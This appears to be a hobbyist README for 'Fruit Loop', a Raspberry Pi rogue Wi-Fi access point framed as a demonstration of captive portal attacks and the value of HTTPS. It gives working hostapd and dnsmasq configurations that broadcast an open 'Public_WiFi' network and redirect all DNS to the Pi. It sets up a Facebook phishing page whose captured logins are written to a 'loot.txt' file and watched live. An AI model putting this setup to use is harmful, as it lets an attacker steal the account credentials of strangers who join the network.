### 📁 Project: Fruit Loop (WiFi Pineapple Clone)
## Goal: Create a rogue Access Point to demonstrate Captive Portal attacks, DNS Spoofing, and the importance of HTTPS.
### Phase 1: OS Installation & Headless Setup
To run the Pi without a monitor (Headless), you need to pre-configure the Wi-Fi.
Flash the SD Card: Use Raspberry Pi Imager.
Device : Raspberry Pi Zero 2 W(or the device u have)
OS: Raspberry Pi OS (32-bit).
Storage: The SD Card u have

### Customisation:
hostname: fruitloop(or whatever ud like)
## Location: 
captial: ur capital
Time Zone: ur timezone 
Set username: admin and password.
Note: Whatever u configure u must remember and use those exact to access the website ull make
Configure Wireless LAN: (Enter your Phone/Home WiFi SSID and Password).
#ex: 
SSID: Test15
password: TEST123
Services: Enable SSH (Use password authentication).
Enable Raspberry Pi Connect
# Write until its succesfull safely remove the sd card from ur device and proceed to:
First Boot: Insert the SD card into the Pi Zero 2 W and power it on.
Identify the IP: Use the Fing app on your phone to find the Pi's IP address (e.g., 10.200.252.58).
Connect via SSH: Open your laptop terminal and type:
ssh admin@10.200.252.58(ip of the raspberry do note that it changes every time)
# OR
ssh admin@fruitloop.local

### Phase 2: Web Server & Facebook Phishing Page
We need a place to "host" the fake login and a script to save the credentials.
in this project it is facebook
but do note that only those who are connected under the same network as pi is connected to can only access that phishing website
# Install Apache & PHP:
sudo apt update
sudo apt install apache2 php libapache2-mod-php -y
# Clear Default Files:
cd /var/www/html
sudo rm index.html
# Deploy the Payload:
sudo nano index.php
Paste the code (with the PHP file_put_contents logic at the top).
# Setup the Loot File:
sudo touch loot.txt
sudo chmod 666 loot.txt
sudo chown www-data:www-data loot.txt

### Phase 3: Wireless Hardware Integration
Now we use the wifi adapter to broadcast the trap network.
# Check Adapter: Plug in your wifi adapter and run iw dev. You should see wlan0 (Internal) and wlan1 (Tenda)
# Install Networking Tools:
sudo apt install hostapd dnsmasq -y
# Configure Hostapd (The WiFi Broadcaster): 
sudo nano /etc/hostapd/hostapd.conf
interface=wlan1
ssid=Public_WiFi
hw_mode=g
channel=6
auth_algs=1
wmm_enabled=0
# Configure Dnsmasq (The DNS Spoofer):
sudo nano /etc/dnsmasq.conf
interface=wlan1
dhcp-range=192.168.4.2,192.168.4.20,255.255.255.0,24h
address=/#/192.168.4.1

### Phase 4: Launching the Attack
Run these commands to start the rogue network.
# Set Static IP for the Antenna:
sudo ifconfig wlan1 192.168.4.1 netmask 255.255.255.0
# Start Services:
sudo systemctl unmask hostapd
sudo systemctl restart hostapd
sudo systemctl restart dnsmasq

### Phase 5: Monitoring the "Loot"
Once someone connects to "Public_WiFi" and tries to browse the web, they will be redirected to your login page. To see their inputs in real-time on your terminal:
tail -f /var/www/html/loot.txt 
# OR
if alr in /var/www/html directory simply use:
cat loot.txt
